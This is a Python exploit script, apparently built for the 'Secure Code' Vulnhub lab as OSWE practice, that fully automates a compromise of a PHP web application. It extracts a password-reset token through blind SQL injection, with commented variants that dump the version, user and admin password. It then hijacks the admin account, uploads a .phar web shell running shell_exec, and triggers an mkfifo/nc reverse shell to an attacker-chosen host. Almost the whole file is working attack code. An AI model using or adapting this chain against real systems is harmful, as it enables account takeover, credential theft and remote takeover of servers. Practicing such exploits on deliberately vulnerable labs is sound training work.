#!/bin/python3
import sys
import requests
import signal
from colorama import Fore, Style
import time

cookies = {"PHPSESSID": "stse731pj1qtm278p9l9su1jmb"}
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"}
target_ip = "192.168.1.76"
target_port = "80"


def printBanner():
    banner = r"""   __   __     ___       ___
  / /  / /__ _/ _ \__ __<  /
 / _ \/ / _ `/ // /\ \ // / 
/_.__/_/\_,_/\___//_\_\/_/  
                            """

    print(Fore.RED + banner + Style.RESET_ALL)


print(Fore.GREEN + "\n|=====================================================|" + Style.RESET_ALL)
print(Fore.GREEN + "| Developed by : Bla0x1                               |" + Style.RESET_ALL)
print(Fore.GREEN + "| Website : https://bla0x1s-organization.gitbook.io/  |" + Style.RESET_ALL)
print(Fore.GREEN + "| Machine : Secure Code the Vulnhub                   |" + Style.RESET_ALL)  
print(Fore.GREEN + "| Script created for how you practice for the OSWE    |" + Style.RESET_ALL)
print(Fore.GREEN + "|=====================================================|" + Style.RESET_ALL)
    


def defHandler(sig, frame):
    print(Fore.RED + "\n\n[+] Exit..." + Style.RESET_ALL)
    sys.exit(1)

signal.signal(signal.SIGINT, defHandler )


def requestToken():
    url = f"http://{target_ip}:{target_port}/login/resetPassword.php"
    data = {"username": "admin"}

    try:
        response = requests.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False)
        print(Fore.CYAN + "[✓] Token send!" if response.status_code == 302 else "[+] Failed to send token!" + Style.RESET_ALL)

    except requests.exceptions.RequestException as e:
        print("[x] Failed:", e)

def checkSqli(inj_str):
    for value in range(32, 127):
        url = f"http://{target_ip}:{target_port}/item/viewItem.php?id={inj_str.replace('[CHAR]', str(value))}"
        r = requests.get(url, cookies=cookies, headers=headers, allow_redirects=False)
        if r.status_code != 302:
            return value
    return None

def sqlTokenInjection():
    token = ""
    elements = ['-', '\\', '|', '/']
    for each in range(1, 100):
        # Version
        #inyectionQuery = "1/**/AND/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % each
        # User
        #inyectionQuery = "1/**/AND/**/(ascii(substring((select/**/user()),%d,1)))=[CHAR]%%23" % each
        # Dump password
        #inyectionQuery = "1/**/AND/**/(ascii(substring((select/**/password/**/from/**/user/**/where/**/id/**/=/**/1),%d,1)))=[CHAR]%%23" % each
        # Token
        inyectionQuery = "1/**/AND/**/(ascii(substring((select/**/token/**/from/**/user/**/where/**/id/**/=/**/1),%d,1)))=[CHAR]%%23" % each    

        # 1 and (ascii(substring((select version()), 1,1 )))=[CHAR]#
        frame = each % len(elements)
        print(f'\r[{elements[frame]*each:=<16}]', end='')
        time.sleep(0.2)
        try:
            exfilChar = chr(checkSqli(inyectionQuery))
            sys.stdout.write("\r")
            sys.stdout.flush()

            if exfilChar:
                token += exfilChar
        except:
            print(Fore.CYAN + "\n[✓] Sqli Attack!" + Style.RESET_ALL)
            break

    print(Fore.CYAN + "\n[✓] Obtained Token: " + token + Style.RESET_ALL)
    return token

def changePassword(token):
    _password = input(Fore.CYAN + "\n >> Add the password you want for admin: " + Style.RESET_ALL)
    url = f"http://{target_ip}:{target_port}/login/doChangePassword.php"
    data = {
    "token": token,
    "password": _password
    }

    try:
        response = requests.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False)
        response.raise_for_status()

        if response.status_code == 302:
            print(Fore.CYAN + "\n[✓] Change password to: " + _password + Style.RESET_ALL)
        else:
            print("[x] Failed!")
    except requests.exceptions.RequestException as e:
        print("[x] Failed:", e)
    return _password

def login(_password):
    login = f"http://{target_ip}:{target_port}/login/checkLogin.php"
    data_login = {
        "username": "admin",
        "password": _password
    }

    try:
        response = requests.post(login, data=data_login, cookies=cookies, headers=headers, allow_redirects=False)
        response.raise_for_status()

        if response.status_code == 302:
            print(Fore.CYAN + "[✓] Login accessed!" + Style.RESET_ALL)
        else:
            print("[+] Could not enter!")
    except requests.exceptions.RequestException as e:
        print("[x] Failed!", e)

def rce():
    url = f"http://{target_ip}:{target_port}/item/updateItem.php"
    header_rce = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryRHO07T7UzAHZx9hL"
    }

    rce_name = input(Fore.CYAN + "\n >> Add the name for the RCE: " + Style.RESET_ALL)
    data_rce = f'''------WebKitFormBoundaryRHO07T7UzAHZx9hL
Content-Disposition: form-data; name="id"

3
------WebKitFormBoundaryRHO07T7UzAHZx9hL
Content-Disposition: form-data; name="id_user"

1
------WebKitFormBoundaryRHO07T7UzAHZx9hL
Content-Disposition: form-data; name="name"

Mask
------WebKitFormBoundaryRHO07T7UzAHZx9hL
Content-Disposition: form-data; name="image"; filename="{rce_name}.phar"
Content-Type: application/octet-stream

<?php echo shell_exec($_GET['cmd']); ?>
------WebKitFormBoundaryRHO07T7UzAHZx9hL
Content-Disposition: form-data; name="description"

Maski
------WebKitFormBoundaryRHO07T7UzAHZx9hL
Content-Disposition: form-data; name="price"

22
------WebKitFormBoundaryRHO07T7UzAHZx9hL--'''

    try:
        response = requests.post(url, data=data_rce, cookies=cookies, headers=header_rce, allow_redirects=False)
        response.raise_for_status()

        if response.status_code == 302:
            print(Fore.CYAN + "\n[✓] Payload Inyection!" + Style.RESET_ALL)
        else:
            print("[x] Failed!")
    except requests.exceptions.RequestException as e:
        print("[x] Failed:", e)
    return rce_name

def console(rce_name):
    print(Fore.CYAN + "\n[✓] Add your ip and your port to get your reverse shell, but first listen on the port you chose!:" + Style.RESET_ALL)
    you_ip = input(Fore.CYAN + "\n >> IP: " + Style.RESET_ALL)
    you_port = input(Fore.CYAN + " >> PORT: " + Style.RESET_ALL)
    reverse_shell = f"rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20{you_ip}%20{you_port}%20%3E%2Ftmp%2Ff"
    url_comando = f"http://{target_ip}:{target_port}/item/image/{rce_name}.phar?cmd={reverse_shell}"

    try:
        response = requests.get(url_comando, cookies=cookies, headers=headers, allow_redirects=False)
        response.raise_for_status
        

    except requests.exceptions.RequestException as e:
        print("[x] Failed:", e)
    
def main():

    printBanner()
    requestToken()
    login(changePassword(sqlTokenInjection()))
    console(rce())


if __name__ == "__main__":
    main()